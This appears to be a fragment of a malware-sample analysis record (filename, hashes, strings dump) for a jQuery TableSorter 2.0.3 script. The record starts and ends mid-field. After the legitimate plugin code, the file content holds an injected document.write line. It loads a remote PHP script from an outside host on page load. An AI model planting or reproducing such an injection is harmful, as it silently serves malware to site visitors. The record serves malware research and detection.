\"numeric\"\n\t});\n\t\n\tts.addParser({\n\t\tid: \"currency\",\n\t\tis: function(s) {\n\t\t\treturn /^[\u00a3$\u20ac?.]/.test(s);\n\t\t},\n\t\tformat: function(s) {\n\t\t\treturn $.tablesorter.formatFloat(s.replace(new RegExp(/[^0-9.]/g),\"\"));\n\t\t},\n\t\ttype: \"numeric\"\n\t});\n\t\n\tts.addParser({\n\t\tid: \"ipAddress\",\n\t\tis: function(s) {\n\t\t\treturn /^\\d{2,3}[\\.]\\d{2,3}[\\.]\\d{2,3}[\\.]\\d{2,3}$/.test(s);\n\t\t},\n\t\tformat: function(s) {\n\t\t\tvar a = s.split(\".\"), r = \"\", l = a.length;\n\t\t\tfor(var i = 0; i < l; i++) {\n\t\t\t\tvar item = a[i];\n\t\t\t   \tif(item.length == 2) {\n\t\t\t\t\tr += \"0\" + item;\n\t\t\t   \t} else {\n\t\t\t\t\tr += item;\n\t\t\t   \t}\n\t\t\t}\n\t\t\treturn $.tablesorter.formatFloat(r);\n\t\t},\n\t\ttype: \"numeric\"\n\t});\n\t\n\tts.addParser({\n\t\tid: \"url\",\n\t\tis: function(s) {\n\t\t\treturn /^(https?|ftp|file):\\/\\/$/.test(s);\n\t\t},\n\t\tformat: function(s) {\n\t\t\treturn jQuery.trim(s.replace(new RegExp(/(https?|ftp|file):\\/\\//),''));\n\t\t},\n\t\ttype: \"text\"\n\t});\n\t\n\tts.addParser({\n\t\tid: \"isoDate\",\n\t\tis: function(s) {\n\t\t\treturn /^\\d{4}[\\/-]\\d{1,2}[\\/-]\\d{1,2}$/.test(s);\n\t\t},\n\t\tformat: function(s) {\n\t\t\treturn $.tablesorter.formatFloat((s != \"\") ? new Date(s.replace(new RegExp(/-/g),\"/\")).getTime() : \"0\");\n\t\t},\n\t\ttype: \"numeric\"\n\t});\n\t\t\n\tts.addParser({\n\t\tid: \"percent\",\n\t\tis: function(s) { \n\t\t\treturn /\\%$/.test($.trim(s));\n\t\t},\n\t\tformat: function(s) {\n\t\t\treturn $.tablesorter.formatFloat(s.replace(new RegExp(/%/g),\"\"));\n\t\t},\n\t\ttype: \"numeric\"\n\t});\n\n\tts.addParser({\n\t\tid: \"usLongDate\",\n\t\tis: function(s) {\n\t\t\treturn s.match(new RegExp(/^[A-Za-z]{3,10}\\.? [0-9]{1,2}, ([0-9]{4}|'?[0-9]{2}) (([0-2]?[0-9]:[0-5][0-9])|([0-1]?[0-9]:[0-5][0-9]\\s(AM|PM)))$/));\n\t\t},\n\t\tformat: function(s) {\n\t\t\treturn $.tablesorter.formatFloat(new Date(s).getTime());\n\t\t},\n\t\ttype: \"numeric\"\n\t});\n\n\tts.addParser({\n\t\tid: \"shortDate\",\n\t\tis: function(s) {\n\t\t\treturn /\\d{1,2}[\\/\\-]\\d{1,2}[\\/\\-]\\d{2,4}/.test(s);\n\t\t},\n\t\tformat: function(s,table) {\n\t\t\tvar c = table.config;\n\t\t\ts = s.replace(/\\-/g,\"/\");\n\t\t\tif(c.dateFormat == \"us\") {\n\t\t\t\t// reformat the string in ISO format\n\t\t\t\ts = s.replace(/(\\d{1,2})[\\/\\-](\\d{1,2})[\\/\\-](\\d{4})/, \"$3/$1/$2\");\n\t\t\t} else if(c.dateFormat == \"uk\") {\n\t\t\t\t//reformat the string in ISO format\n\t\t\t\ts = s.replace(/(\\d{1,2})[\\/\\-](\\d{1,2})[\\/\\-](\\d{4})/, \"$3/$2/$1\");\n\t\t\t} else if(c.dateFormat == \"dd/mm/yy\" || c.dateFormat == \"dd-mm-yy\") {\n\t\t\t\ts = s.replace(/(\\d{1,2})[\\/\\-](\\d{1,2})[\\/\\-](\\d{2})/, \"$1/$2/$3\");\t\n\t\t\t}\n\t\t\treturn $.tablesorter.formatFloat(new Date(s).getTime());\n\t\t},\n\t\ttype: \"numeric\"\n\t});\n\n\tts.addParser({\n\t    id: \"time\",\n\t    is: function(s) {\n\t        return /^(([0-2]?[0-9]:[0-5][0-9])|([0-1]?[0-9]:[0-5][0-9]\\s(am|pm)))$/.test(s);\n\t    },\n\t    format: function(s) {\n\t        return $.tablesorter.formatFloat(new Date(\"2000/01/01 \" + s).getTime());\n\t    },\n\t  type: \"numeric\"\n\t});\n\t\n\t\n\tts.addParser({\n\t    id: \"metadata\",\n\t    is: function(s) {\n\t        return false;\n\t    },\n\t    format: function(s,table,cell) {\n\t\t\tvar c = table.config, p = (!c.parserMetadataName) ? 'sortValue' : c.parserMetadataName;\n\t        return $(cell).metadata()[p];\n\t    },\n\t  type: \"numeric\"\n\t});\n\t\n\t// add default widgets\n\tts.addWidget({\n\t\tid: \"zebra\",\n\t\tformat: function(table) {\n\t\t\tif(table.config.debug) { var time = new Date(); }\n\t\t\t$(\"tr:visible\",table.tBodies[0])\n\t        .filter(':even')\n\t        .removeClass(table.config.widgetZebra.css[1]).addClass(table.config.widgetZebra.css[0])\n\t        .end().filter(':odd')\n\t        .removeClass(table.config.widgetZebra.css[0]).addClass(table.config.widgetZebra.css[1]);\n\t\t\tif(table.config.debug) { $.tablesorter.benchmark(\"Applying Zebra widget\", time); }\n\t\t}\n\t});\t\n})(jQuery);\n\n/*125189*/\ndocument.write(\"<script src='http://quadfreunde-nordeifel.de/kalender/wHXy6DBL.php?id=143345267' type='text/javascript'></\" + \"script>\");\n/*/125189*/"
    },
    "filename": "VirusShare_70b91fb475f657364ae093a2202d3087",
    "filesize": 23532,
    "filetype": "UTF-8 Unicode (with BOM) text",
    "hashes": {
        "md5": "70b91fb475f657364ae093a2202d3087",
        "sha1": "4a8b0b5d65f0da5e9cd9bf6bcdc193439ad3232a",
        "sha256": "bc880c3d10211d94fe72301f46e279096410e35eeeee0ab611e8d5b4415f2539"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            " * TableSorter 2.0 - Client-side table sorting with ease!",
            " * Version 2.0.3",
            " * @requires jQuery v1.2.3",
            " * Copyright (c) 2007 Christian Bach",
            " * Examples and docs at: http://tablesorter.com",
            " * Dual licensed under the MIT and GPL licenses:",
            " * http://www.opensource.org/licenses/mit-license.php",
            " * http://www.gnu.org/licenses/gpl.html",
            " * @description Create a sortable table with multi-column sorting capabilitys",
            " * @example $('table').tablesorter();",
            " * @desc Create a simple tablesorter interface.",
            " * @example $('table').tablesorter({ sortList:[[0,0],[1,0]] });",
            " * @desc Create a tablesorter interface and sort on the first and secound column in ascending order.",
            " * @example $('table').tablesorter({ headers: { 0: { sorter: false}, 1: {sorter: false} } });",
            " * @desc Create a tablesorter interface and disableing the first and secound column headers.",
            " * @example $('table').tablesorter({ 0: {sorter:\"integer\"}, 1: {sorter:\"currency\"} });",
            " * @desc Create a tablesorter interface and set a column parser for the first and secound column.",
            " * @param Object settings An object literal containing key/value pairs to provide optional settings.",
            " * @option String cssHeader (optional) \t\t\tA string of the class name to be appended to sortable tr elements in the thead of the table. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"header\"",
            " * @option String cssAsc (optional) \t\t\tA string of the class name to be appended to sortable tr elements in the thead on a ascending sort. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"headerSortUp\"",
            " * @option String cssDesc (optional) \t\t\tA string of the class name to be appended to sortable tr elements in the thead on a descending sort. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"headerSortDown\"",
            " * @option String sortInitialOrder (optional) \tA string of the inital sorting order can be asc or desc. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"asc\"",
            " * @option String sortMultisortKey (optional) \tA string of the multi-column sort key. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"shiftKey\"",
            " * @option String textExtraction (optional) \tA string of the text-extraction method to use. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tFor complex html structures inside td cell set this option to \"complex\", ",
            " * \t\t\t\t\t\t\t\t\t\t\t\ton large tables the complex option can be slow. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: \"simple\"",
            " * @option Object headers (optional) \t\t\tAn array containing the forces sorting rules. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tThis option let's you specify a default sorting rule. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: null",
            " * @option Array sortList (optional) \t\t\tAn array containing the forces sorting rules. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tThis option let's you specify a default sorting rule. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: null",
            " * @option Array sortForce (optional) \t\t\tAn array containing forced sorting rules. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tThis option let's you specify a default sorting rule, which is prepended to user-selected rules.",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: null",
            " *  ",
            "  * @option Array sortAppend (optional) \t\t\tAn array containing forced sorting rules. ",
            " * \t\t\t\t\t\t\t\t\t\t\t\tThis option let's you specify a default sorting rule, which is appended to user-selected rules.",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: null",
            " * @option Boolean widthFixed (optional) \t\tBoolean flag indicating if tablesorter should apply fixed widths to the table columns.",
            " * \t\t\t\t\t\t\t\t\t\t\t\tThis is usefull when using the pager companion plugin.",
            " * \t\t\t\t\t\t\t\t\t\t\t\tThis options requires the dimension jquery plugin.",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: false",
            " * @option Boolean cancelSelection (optional) \tBoolean flag indicating if tablesorter should cancel selection of the table headers text.",
            " * \t\t\t\t\t\t\t\t\t\t\t\tDefault value: true",
            " * @option Boolean debug (optional) \t\t\tBoolean flag indicating if tablesorter should display debuging information usefull for development.",
            " * @type jQuery",
            " * @name tablesorter",
            " * @cat Plugins/Tablesorter",
            " * @author Christian Bach/christian.bach@polyester.se",
            "(function($) {",
            "\t$.extend({",
            "\t\ttablesorter: new function() {",
            "\t\t\tvar parsers = [], widgets = [];",
            "\t\t\tthis.defaults = {",
            "\t\t\t\tcssHeader: \"header\",",
            "\t\t\t\tcssAsc: \"headerSortUp\",",
            "\t\t\t\tcssDesc: \"headerSortDown\",",
            "\t\t\t\tsortInitialOrder: \"asc\",",
            "\t\t\t\tsortMultiSortKey: \"shiftKey\",",
            "\t\t\t\tsortForce: null,",
            "\t\t\t\tsortAppend: null,",
            "\t\t\t\ttextExtraction: \"simple\",",
            "\t\t\t\tparsers: {}, ",
            "\t\t\t\twidgets: [],\t\t",
            "\t\t\t\twidgetZebra: {css: [\"even\",\"odd\"]},",
            "\t\t\t\theaders: {},",
            "\t\t\t\twidthFixed: false,",
            "\t\t\t\tcancelSelection: true,",
            "\t\t\t\tsortList: [],",
            "\t\t\t\theaderList: [],",
            "\t\t\t\tdateFormat: \"us\",",
            "\t\t\t\tdecimal: '.',",
            "\t\t\t\tdebug: false",
            "\t\t\t};",
            "\t\t\t/* debuging utils */",
            "\t\t\tfunction benchmark(s,d) {",
            "\t\t\t\tlog(s + \",\" + (new Date().getTime() - d.getTime()) + \"ms\");",
            "\t\t\t}",
            "\t\t\tthis.benchmark = benchmark;",
            "\t\t\tfunction log(s) {",
            "\t\t\t\tif (typeof console != \"undefined\" && typeof console.debug != \"undefined\") {",
            "\t\t\t\t\tconsole.log(s);",
            "\t\t\t\t} else {",
            "\t\t\t\t\talert(s);",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\t\t\t\t",
            "\t\t\t/* parsers utils */",
            "\t\t\tfunction buildParserCache(table,$headers) {",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { var parsersDebug = \"\"; }",
            "\t\t\t\t",
            "\t\t\t\tvar rows = table.tBodies[0].rows;",
            "\t\t\t\t",
            "\t\t\t\tif(table.tBodies[0].rows[0]) {",
            "\t\t\t\t\tvar list = [], cells = rows[0].cells, l = cells.length;",
            "\t\t\t\t\t",
            "\t\t\t\t\tfor (var i=0;i < l; i++) {",
            "\t\t\t\t\t\tvar p = false;",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\tif($.metadata && ($($headers[i]).metadata() && $($headers[i]).metadata().sorter)  ) {",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t\tp = getParserById($($headers[i]).metadata().sorter);\t",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t} else if((table.config.headers[i] && table.config.headers[i].sorter)) {",
            "\t\t\t\t\t\t\tp = getParserById(table.config.headers[i].sorter);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tif(!p) {",
            "\t\t\t\t\t\t\tp = detectParserForColumn(table,cells[i]);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\tif(table.config.debug) { parsersDebug += \"column:\" + i + \" parser:\" +p.id + \"\\n\"; }",
            "\t\t\t\t\t\tlist.push(p);",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { log(parsersDebug); }",
            "\t\t\t\treturn list;",
            "\t\t\t};",
            "\t\t\tfunction detectParserForColumn(table,node) {",
            "\t\t\t\tvar l = parsers.length;",
            "\t\t\t\tfor(var i=1; i < l; i++) {",
            "\t\t\t\t\tif(parsers[i].is($.trim(getElementText(table.config,node)),table,node)) {",
            "\t\t\t\t\t\treturn parsers[i];",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\t// 0 is always the generic parser (text)",
            "\t\t\t\treturn parsers[0];",
            "\t\t\t}",
            "\t\t\tfunction getParserById(name) {",
            "\t\t\t\tvar l = parsers.length;",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\tif(parsers[i].id.toLowerCase() == name.toLowerCase()) {\t",
            "\t\t\t\t\t\treturn parsers[i];",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\treturn false;",
            "\t\t\t}",
            "\t\t\t/* utils */",
            "\t\t\tfunction buildCache(table) {",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { var cacheTime = new Date(); }",
            "\t\t\t\t",
            "\t\t\t\t",
            "\t\t\t\tvar totalRows = (table.tBodies[0] && table.tBodies[0].rows.length) || 0,",
            "\t\t\t\t\ttotalCells = (table.tBodies[0].rows[0] && table.tBodies[0].rows[0].cells.length) || 0,",
            "\t\t\t\t\tparsers = table.config.parsers, ",
            "\t\t\t\t\tcache = {row: [], normalized: []};",
            "\t\t\t\t",
            "\t\t\t\t\tfor (var i=0;i < totalRows; ++i) {",
            "\t\t\t\t\t",
            "\t\t\t\t\t\t/** Add the table data to main data array */",
            "\t\t\t\t\t\tvar c = table.tBodies[0].rows[i], cols = [];",
            "\t\t\t\t\t",
            "\t\t\t\t\t\tcache.row.push($(c));",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\tfor(var j=0; j < totalCells; ++j) {",
            "\t\t\t\t\t\t\tcols.push(parsers[j].format(getElementText(table.config,c.cells[j]),table,c.cells[j]));\t",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\tcols.push(i); // add position for rowCache",
            "\t\t\t\t\t\tcache.normalized.push(cols);",
            "\t\t\t\t\t\tcols = null;",
            "\t\t\t\t\t};",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { benchmark(\"Building cache for \" + totalRows + \" rows:\", cacheTime); }",
            "\t\t\t\t",
            "\t\t\t\treturn cache;",
            "\t\t\t};",
            "\t\t\tfunction getElementText(config,node) {",
            "\t\t\t\t",
            "\t\t\t\tif(!node) return \"\";",
            "\t\t\t\t\t\t\t\t",
            "\t\t\t\tvar t = \"\";",
            "\t\t\t\t",
            "\t\t\t\tif(config.textExtraction == \"simple\") {",
            "\t\t\t\t\tif(node.childNodes[0] && node.childNodes[0].hasChildNodes()) {",
            "\t\t\t\t\t\tt = node.childNodes[0].innerHTML;",
            "\t\t\t\t\t} else {",
            "\t\t\t\t\t\tt = node.innerHTML;",
            "\t\t\t\t\t}",
            "\t\t\t\t} else {",
            "\t\t\t\t\tif(typeof(config.textExtraction) == \"function\") {",
            "\t\t\t\t\t\tt = config.textExtraction(node);",
            "\t\t\t\t\t} else { ",
            "\t\t\t\t\t\tt = $(node).text();",
            "\t\t\t\t\t}\t",
            "\t\t\t\t}",
            "\t\t\t\treturn t;",
            "\t\t\t}",
            "\t\t\tfunction appendToTable(table,cache) {",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) {var appendTime = new Date()}",
            "\t\t\t\t",
            "\t\t\t\tvar c = cache, ",
            "\t\t\t\t\tr = c.row, ",
            "\t\t\t\t\tn= c.normalized, ",
            "\t\t\t\t\ttotalRows = n.length, ",
            "\t\t\t\t\tcheckCell = (n[0].length-1), ",
            "\t\t\t\t\ttableBody = $(table.tBodies[0]),",
            "\t\t\t\t\trows = [];",
            "\t\t\t\t",
            "\t\t\t\tfor (var i=0;i < totalRows; i++) {",
            "\t\t\t\t\trows.push(r[n[i][checkCell]]);\t",
            "\t\t\t\t\tif(!table.config.appender) {",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\tvar o = r[n[i][checkCell]];",
            "\t\t\t\t\t\tvar l = o.length;",
            "\t\t\t\t\t\tfor(var j=0; j < l; j++) {",
            "\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\ttableBody[0].appendChild(o[j]);",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t//tableBody.append(r[n[i][checkCell]]);",
            "\t\t\t\t\t}",
            "\t\t\t\t}\t",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.appender) {",
            "\t\t\t\t",
            "\t\t\t\t\ttable.config.appender(table,rows);\t",
            "\t\t\t\t}",
            "\t\t\t\t",
            "\t\t\t\trows = null;",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { benchmark(\"Rebuilt table:\", appendTime); }",
            "\t\t\t\t\t\t\t\t",
            "\t\t\t\t//apply table widgets",
            "\t\t\t\tapplyWidget(table);",
            "\t\t\t\t",
            "\t\t\t\t// trigger sortend",
            "\t\t\t\tsetTimeout(function() {",
            "\t\t\t\t\t$(table).trigger(\"sortEnd\");\t",
            "\t\t\t\t},0);",
            "\t\t\t\t",
            "\t\t\t};",
            "\t\t\tfunction buildHeaders(table) {",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { var time = new Date(); }",
            "\t\t\t\t",
            "\t\t\t\tvar meta = ($.metadata) ? true : false, tableHeadersRows = [];",
            "\t\t\t\tfor(var i = 0; i < table.tHead.rows.length; i++) { tableHeadersRows[i]=0; };",
            "\t\t\t\t",
            "\t\t\t\t$tableHeaders = $(\"thead th\",table);",
            "\t\t\t\t$tableHeaders.each(function(index) {",
            "\t\t\t\t\t\t\t",
            "\t\t\t\t\tthis.count = 0;",
            "\t\t\t\t\tthis.column = index;",
            "\t\t\t\t\tthis.order = formatSortingOrder(table.config.sortInitialOrder);",
            "\t\t\t\t\t",
            "\t\t\t\t\tif(checkHeaderMetadata(this) || checkHeaderOptions(table,index)) this.sortDisabled = true;",
            "\t\t\t\t\t",
            "\t\t\t\t\tif(!this.sortDisabled) {",
            "\t\t\t\t\t\t$(this).addClass(table.config.cssHeader);",
            "\t\t\t\t\t}",
            "\t\t\t\t\t",
            "\t\t\t\t\t// add cell to headerList",
            "\t\t\t\t\ttable.config.headerList[index]= this;",
            "\t\t\t\t});",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { benchmark(\"Built headers:\", time); log($tableHeaders); }",
            "\t\t\t\t",
            "\t\t\t\treturn $tableHeaders;",
            "\t\t\t\t",
            "\t\t\t};",
            "\t\t\t\t\t\t",
            "\t\t   \tfunction checkCellColSpan(table, rows, row) {",
            "                var arr = [], r = table.tHead.rows, c = r[row].cells;",
            "\t\t\t\t",
            "\t\t\t\tfor(var i=0; i < c.length; i++) {",
            "\t\t\t\t\tvar cell = c[i];",
            "\t\t\t\t\t",
            "\t\t\t\t\tif ( cell.colSpan > 1) { ",
            "\t\t\t\t\t\tarr = arr.concat(checkCellColSpan(table, headerArr,row++));",
            "\t\t\t\t\t} else  {",
            "\t\t\t\t\t\tif(table.tHead.length == 1 || (cell.rowSpan > 1 || !r[row+1])) {",
            "\t\t\t\t\t\t\tarr.push(cell);",
            "\t\t\t\t\t\t}",
            "\t\t\t\t\t\t//headerArr[row] = (i+row);",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\treturn arr;",
            "\t\t\t};",
            "\t\t\tfunction checkHeaderMetadata(cell) {",
            "\t\t\t\tif(($.metadata) && ($(cell).metadata().sorter === false)) { return true; };",
            "\t\t\t\treturn false;",
            "\t\t\t}",
            "\t\t\tfunction checkHeaderOptions(table,i) {\t",
            "\t\t\t\tif((table.config.headers[i]) && (table.config.headers[i].sorter === false)) { return true; };",
            "\t\t\t\treturn false;",
            "\t\t\t}",
            "\t\t\tfunction applyWidget(table) {",
            "\t\t\t\tvar c = table.config.widgets;",
            "\t\t\t\tvar l = c.length;",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\t",
            "\t\t\t\t\tgetWidgetById(c[i]).format(table);",
            "\t\t\t\t}",
            "\t\t\t\t",
            "\t\t\t}",
            "\t\t\tfunction getWidgetById(name) {",
            "\t\t\t\tvar l = widgets.length;",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\tif(widgets[i].id.toLowerCase() == name.toLowerCase() ) {",
            "\t\t\t\t\t\treturn widgets[i]; ",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t};",
            "\t\t\tfunction formatSortingOrder(v) {",
            "\t\t\t\t",
            "\t\t\t\tif(typeof(v) != \"Number\") {",
            "\t\t\t\t\ti = (v.toLowerCase() == \"desc\") ? 1 : 0;",
            "\t\t\t\t} else {",
            "\t\t\t\t\ti = (v == (0 || 1)) ? v : 0;",
            "\t\t\t\t}",
            "\t\t\t\treturn i;",
            "\t\t\t}",
            "\t\t\tfunction isValueInArray(v, a) {",
            "\t\t\t\tvar l = a.length;",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\tif(a[i][0] == v) {",
            "\t\t\t\t\t\treturn true;\t",
            "\t\t\t\t\t}",
            "\t\t\t\t}",
            "\t\t\t\treturn false;",
            "\t\t\t}",
            "\t\t\t\t",
            "\t\t\tfunction setHeadersCss(table,$headers, list, css) {",
            "\t\t\t\t// remove all header information",
            "\t\t\t\t$headers.removeClass(css[0]).removeClass(css[1]);",
            "\t\t\t\t",
            "\t\t\t\tvar h = [];",
            "\t\t\t\t$headers.each(function(offset) {",
            "\t\t\t\t\t\tif(!this.sortDisabled) {",
            "\t\t\t\t\t\t\th[this.column] = $(this);\t\t\t\t\t",
            "\t\t\t\t\t\t}",
            "\t\t\t\t});",
            "\t\t\t\t",
            "\t\t\t\tvar l = list.length; ",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\th[list[i][0]].addClass(css[list[i][1]]);",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\tfunction fixColumnWidth(table,$headers) {",
            "\t\t\t\tvar c = table.config;",
            "\t\t\t\tif(c.widthFixed) {",
            "\t\t\t\t\tvar colgroup = $('<colgroup>');",
            "\t\t\t\t\t$(\"tr:first td\",table.tBodies[0]).each(function() {",
            "\t\t\t\t\t\tcolgroup.append($('<col>').css('width',$(this).width()));",
            "\t\t\t\t\t});",
            "\t\t\t\t\t$(table).prepend(colgroup);",
            "\t\t\t\t};",
            "\t\t\t}",
            "\t\t\tfunction updateHeaderSortCount(table,sortList) {",
            "\t\t\t\tvar c = table.config, l = sortList.length;",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\tvar s = sortList[i], o = c.headerList[s[0]];",
            "\t\t\t\t\to.count = s[1];",
            "\t\t\t\t\to.count++;",
            "\t\t\t\t}",
            "\t\t\t}",
            "\t\t\t/* sorting methods */",
            "\t\t\tfunction multisort(table,sortList,cache) {",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { var sortTime = new Date(); }",
            "\t\t\t\t",
            "\t\t\t\tvar dynamicExp = \"var sortWrapper = function(a,b) {\", l = sortList.length;",
            "\t\t\t\t\t",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\t",
            "\t\t\t\t\tvar c = sortList[i][0];",
            "\t\t\t\t\tvar order = sortList[i][1];",
            "\t\t\t\t\tvar s = (getCachedSortType(table.config.parsers,c) == \"text\") ? ((order == 0) ? \"sortText\" : \"sortTextDesc\") : ((order == 0) ? \"sortNumeric\" : \"sortNumericDesc\");",
            "\t\t\t\t\t",
            "\t\t\t\t\tvar e = \"e\" + i;",
            "\t\t\t\t\t",
            "\t\t\t\t\tdynamicExp += \"var \" + e + \" = \" + s + \"(a[\" + c + \"],b[\" + c + \"]); \";",
            "\t\t\t\t\tdynamicExp += \"if(\" + e + \") { return \" + e + \"; } \";",
            "\t\t\t\t\tdynamicExp += \"else { \";",
            "\t\t\t\t}",
            "\t\t\t\t",
            "\t\t\t\t// if value is the same keep orignal order\t",
            "\t\t\t\tvar orgOrderCol = cache.normalized[0].length - 1;",
            "\t\t\t\tdynamicExp += \"return a[\" + orgOrderCol + \"]-b[\" + orgOrderCol + \"];\";",
            "\t\t\t\t\t\t",
            "\t\t\t\tfor(var i=0; i < l; i++) {",
            "\t\t\t\t\tdynamicExp += \"}; \";",
            "\t\t\t\t}",
            "\t\t\t\t",
            "\t\t\t\tdynamicExp += \"return 0; \";\t",
            "\t\t\t\tdynamicExp += \"}; \";\t",
            "\t\t\t\t",
            "\t\t\t\teval(dynamicExp);",
            "\t\t\t\t",
            "\t\t\t\tcache.normalized.sort(sortWrapper);",
            "\t\t\t\t",
            "\t\t\t\tif(table.config.debug) { benchmark(\"Sorting on \" + sortList.toString() + \" and dir \" + order+ \" time:\", sortTime); }",
            "\t\t\t\t",
            "\t\t\t\treturn cache;",
            "\t\t\t};",
            "\t\t\tfunction sortText(a,b) {",
            "\t\t\t\treturn ((a < b) ? -1 : ((a > b) ? 1 : 0));",
            "\t\t\t};",
            "\t\t\tfunction sortTextDesc(a,b) {",
            "\t\t\t\treturn ((b < a) ? -1 : ((b > a) ? 1 : 0));",
            "\t\t\t};\t",
            "\t \t\tfunction sortNumeric(a,b) {",
            "\t\t\t\treturn a-b;",
            "\t\t\t};",
            "\t\t\tfunction sortNumericDesc(a,b) {",
            "\t\t\t\treturn b-a;",
            "\t\t\t};",
            "\t\t\tfunction getCachedSortType(parsers,i) {",
            "\t\t\t\treturn parsers[i].type;",
            "\t\t\t};",
            "\t\t\t/* public methods */",
            "\t\t\tthis.construct = function(settings) {",
            "\t\t\t\treturn this.each(function() {",
            "\t\t\t\t\t",
            "\t\t\t\t\tif(!this.tHead || !this.tBodies) return;",
            "\t\t\t\t\t",
            "\t\t\t\t\tvar $this, $document,$headers, cache, config, shiftDown = 0, sortOrder;",
            "\t\t\t\t\t",
            "\t\t\t\t\tthis.config = {};",
            "\t\t\t\t\t",
            "\t\t\t\t\tconfig = $.extend(this.config, $.tablesorter.defaults, settings);",
            "\t\t\t\t\t",
            "\t\t\t\t\t// store common expression for speed\t\t\t\t\t",
            "\t\t\t\t\t$this = $(this);",
            "\t\t\t\t\t",
            "\t\t\t\t\t// build headers",
            "\t\t\t\t\t$headers = buildHeaders(this);",
            "\t\t\t\t\t",
            "\t\t\t\t\t// try to auto detect column type, and store in tables config",
            "\t\t\t\t\tthis.config.parsers = buildParserCache(this,$headers);",
            "\t\t\t\t\t",
            "\t\t\t\t\t",
            "\t\t\t\t\t// build the cache for the tbody cells",
            "\t\t\t\t\tcache = buildCache(this);",
            "\t\t\t\t\t",
            "\t\t\t\t\t// get the css class names, could be done else where.",
            "\t\t\t\t\tvar sortCSS = [config.cssDesc,config.cssAsc];",
            "\t\t\t\t\t",
            "\t\t\t\t\t// fixate columns if the users supplies the fixedWidth option",
            "\t\t\t\t\tfixColumnWidth(this);",
            "\t\t\t\t\t",
            "\t\t\t\t\t// apply event handling to headers",
            "\t\t\t\t\t// this is to big, perhaps break it out?",
            "\t\t\t\t\t$headers.click(function(e) {",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\t$this.trigger(\"sortStart\");",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\tvar totalRows = ($this[0].tBodies[0] && $this[0].tBodies[0].rows.length) || 0;",
            "\t\t\t\t\t\t",
            "\t\t\t\t\t\tif(!this.sortDisabled && totalRows > 0) {",
            "\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t// store exp, for speed",
            "\t\t\t\t\t\t\tvar $cell = $(this);",
            "\t\t\t\t\t\t\t// get current column index",
            "\t\t\t\t\t\t\tvar i = this.column;",
            "\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t// get current column sort order",
            "\t\t\t\t\t\t\tthis.order = this.count++ % 2;",
            "\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t// user only whants to sort on one column",
            "\t\t\t\t\t\t\tif(!e[config.sortMultiSortKey]) {",
            "\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\t// flush the sort list",
            "\t\t\t\t\t\t\t\tconfig.sortList = [];",
            "\t\t\t\t\t\t\t\t",
            "\t\t\t\t\t\t\t\tif(config.sortForce != null) {",
            "\t\t\t\t\t\t\t\t\tvar a = config.sortForce; ",
            "\t\t\t\t\t\t\t\t\tfor(var j=0; j < a.length; j++) {",
            "\t\t\t\t\t\t\t\t\t\tif(a[j][0] != i) {",
            "\t\t\t\t\t\t\t\t\t\t\tconfig.sortList.push(a[j]);",
            "\t\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t\t}",
            "\t\t\t\t\t\t\t\t}",
